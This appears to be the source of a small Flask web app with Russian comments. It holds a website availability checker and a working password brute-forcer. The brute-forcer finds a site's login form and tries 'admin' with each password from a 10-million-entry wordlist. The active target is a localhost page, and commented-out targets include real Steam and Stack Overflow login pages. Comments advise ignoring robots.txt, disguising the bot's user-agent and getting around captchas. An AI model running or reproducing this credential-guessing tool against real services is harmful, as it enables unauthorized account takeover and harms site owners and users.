from collections import namedtuple

import requests

import re

import mechanize

from flask import Flask, render_template, redirect, url_for, request

app = Flask(__name__)

Message = namedtuple('Message', 'protocol url domain')
messages = []
Info = namedtuple('Info', 'Code Status ResponseTime Result')  # Кортеж для вывода инфорации
information = []


def get_status(url):
    try:
        print('Попытка подключения...')
        response = requests.head(url, timeout=5)
        status_code = response.status_code
        reason = response.reason
        response_time = response.elapsed.total_seconds()
        result = 'all good'
        if response_time > 1.5:
            result = 'Угроза ddos атаки'
    except requests.exceptions.ConnectionError:
        status_code = '000'
        reason = 'Denial of Service'
        response_time = 'Infinity'
        result = 'Сайт недоступен'
    website_status = (status_code, reason, response_time, result)
    return website_status


@app.route('/', methods=['GET'])
def hello_world():
    return render_template('index.html')


@app.route('/main', methods=['GET'])
def main():
    return render_template('main.html', information=information)


@app.route('/bruteforce', methods=['GET'])
def bruteforce():
    return render_template('bruteforce.html')


@app.route('/start_brute', methods=['POST'])
def start_bruteforce():
    br = mechanize.Browser()
    # Установите, следует ли соблюдать правила от роботов.txt.
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)  # Нет роботов
    # Всегда используйте user-Agent, потому что это поможет вам замаскировать личность бота с любым браузером.
    # br.addheaders = ['Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US']
    site = 'http://localhost/login.php'
    # site = 'https://steamcommunity.com/login/home/?goto=market%2F'
    # site = 'https://stackoverflow.com/users/signup?ssrc=head&returnurl=https%3a%2f%2fstackoverflow.com%2fquestions%2f3956280%2fsubmitting-a-form-in-mechanize'
    # site = "https://stackoverflow.com/users/login?ssrc=head"
    response = br.open(site)
    login_url = response.geturl()
    print('Добро пожаловать на', response.geturl())
    print(response.read())
    # ГИБКИЙ ПОИСК ФОРМЫ
    availabe_forms = list(br.forms())
    print("Всего найдено " + str(len(availabe_forms)) + " форм")
    if len(availabe_forms) == 0:
        print('Форма не найдена')  # что-то сделать
        exit()
    index_of_work_form = ""
    for i in range(0, len(availabe_forms)):
        if "POST" in str(availabe_forms[i]):
            index_of_work_form = i  # Нашли индекс рабочей формы.
            print('Найдена форма с методом POST, ее индекс: ' + str(index_of_work_form))  # что-то сделат
    # ГИБКИЙ ПОИСК АТРИБУТОВ
    br.select_form(nr=index_of_work_form)
    availabe_controls = list(br.form.controls)
    password_controls = ""
    login_controls = ""
    for j in range(len(availabe_controls)):
        if "pass" in str(availabe_controls[j]):
            password_controls = availabe_controls[j]
    regexp = r"<TextControl\([a-zA-Z]+=\)>"
    for k in range(len(availabe_controls)):
        match = re.search(regexp, str(availabe_controls[k]))
        if match is not None:
            login_controls = availabe_controls[k]
            # print(match.group(0))
        else:
            pass  # ЧТО-ТО ДЕЛАТЬ
    # ГИБКИЙ ПОИСК ИНПУТОВ логина и пароля
    login_input = ""
    password_input = ""
    regexp_input = r"\(.*\.*\="
    match_password_input = re.search(regexp_input, str(password_controls))
    if match_password_input is not None:
        password_input = match_password_input.group(0)
        password_input = password_input[1:-1]
    else:
        pass  # ЧТО-ТО ДЕЛАТЬ
    match_login_input = re.search(regexp_input, str(login_controls))
    if match_login_input is not None:
        login_input = match_login_input.group(0)
        login_input = login_input[1:-1]
    else:
        pass  # ЧТО-ТО ДЕЛАТЬ
    print(login_input)
    print(password_input)

    # ВВОД УЧЕТНЫХ ДАННЫХ
    def is_logged_in(page_url):
        return not login_url in page_url

    file1 = open("10MPass.txt", "r")
    lines = file1.readlines()
    for line in lines:
        br.select_form(nr=index_of_work_form)
        br.form[login_input] = 'admin'
        br.form[password_input] = str(line.split('\n')[0])
        result = br.submit()
        if is_logged_in(result.geturl()): #ПРОДУМАТЬ ЗАЩИТУ ОТ КАПЧИ
            print("Пароль успешно найден!")
            print('admin: ' + line)
            print(result.geturl())
            br.close()
            file1.close
            break
        else:
            print(line + " Failed")
    #print(response.geturl()) # Страница, на которую должна перенаправлять после авторизации
    # or br.submit(name='Button_Name', label='button_label')
    # br.submit(nr=0) Также можно выбрать на какую кнопку нажимать. Можно выбрать по имени
    return render_template('bruteforce.html')


@app.route('/check_site', methods=['POST'])
def add_message():
    protocol = request.form['protocol']
    url = request.form['url']
    domain = request.form['domain']
    site = '{}://{}.{}'.format(protocol, url, domain)
    website_status = get_status(site)
    Code = website_status[0]
    Status = website_status[1]
    ResponseTime = website_status[2]
    Result = website_status[3]
    print(site)
    print('Код:', website_status[0], '| Статус:', Status, '| Время ответа:', website_status[2], '| Итог:',
          website_status[3])
    information.append(Info(Code, Status, ResponseTime, Result))
    print(information)
    return redirect(url_for('main'))


@app.route('/clear', methods=['POST'])
def clear():
    for i in range(len(information)):
        information[i] = ""
    return redirect(url_for('main'))



'''
# Находим форму по action/ можно еще находить по name и по id
def select_form(form):
    return form.attrs.get('action', None) == 'login.php'
form = br.select_form(predicate=select_form)
    br.submit()
    print(form)
    # br.form.set_all_readonly(False) # Во все элементы можно вписать
    #

'''
